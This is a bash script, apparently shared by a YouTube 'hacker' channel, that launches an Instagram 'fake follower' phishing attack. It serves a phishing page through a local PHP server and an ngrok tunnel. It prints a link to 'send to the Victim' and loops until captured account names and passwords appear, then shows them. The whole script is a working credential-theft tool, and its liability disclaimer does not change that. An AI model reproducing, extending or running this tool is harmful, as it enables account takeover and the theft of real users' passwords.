#!/bin/bash
# Coded by: Keerthan @Expert Hacker
# Follow us on Youtube: Youtube.com/Expert Hacker
# Instagram Fake Follower Phishing Aattack
clear
trap 'printf "\n";stop;exit 1' 2
echo "
███████╗░█████╗░██╗░░░░░██╗░░░░░░█████╗░░██╗░░░░░░░██╗
██╔════╝██╔══██╗██║░░░░░██║░░░░░██╔══██╗░██║░░██╗░░██║
█████╗░░██║░░██║██║░░░░░██║░░░░░██║░░██║░╚██╗████╗██╔╝
██╔══╝░░██║░░██║██║░░░░░██║░░░░░██║░░██║░░████╔═████║░
██║░░░░░╚█████╔╝███████╗███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░
╚═╝░░░░░░╚════╝░╚══════╝╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░

███╗░░░███╗███████╗
████╗░████║██╔════╝
██╔████╔██║█████╗
██║╚██╔╝██║██╔══╝ On Instagram 😜
██║░╚═╝░██║███████╗
╚═╝░░░░░╚═╝╚══════╝" |lolcat

stop() {
#menu
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
fi

}

catch_cred() {
account=$(grep -o 'Account:.*' usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' usernames.txt | cut -d ":" -f2)
#printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt>
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
pkill -f -2 php > /dev/null 2>&1
pkill -f -2 ngrok > /dev/null 2>&1
exit 1
}

echo "-----------------------------------------------------------------------------"
printf "  \e[101m\e[1;77m::  Disclaimer: Developers assume no liability and are not ::\e[0m\n"
printf "  \e[101m\e[1;77m::  Responcible for any missuse or damage caused by this tool ::\e[0m\n"
echo "           Coded By KEERTHAN" |lolcat
echo "YouTube : www.YoutTube.com/Expert Hacker" |lolcat
sleep 1
if [[ -e usernames.txt ]]; then
     {
       rm -rf usernames.txt
     }
     fi
      p=$(pwd)
     printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
      php -S 127.0.0.1:3333 > /dev/null 2>&1 &
     sleep 2
     cd $HOME
     chmod +x ngrok
     printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
     ./ngrok http 3333 > /dev/null 2>&1 &
     sleep 10
     cd $p
    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
    printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
##GETTING CREDENTIAL FROM VICTIM
###############
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting credentials ...\e[0m\n"
    while [ true ]; do


     if [[ -e "usernames.txt" ]]; then
       printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
     catch_cred
      fi
sleep 1
done
###CATCHING CREDENTIALS
 ##############

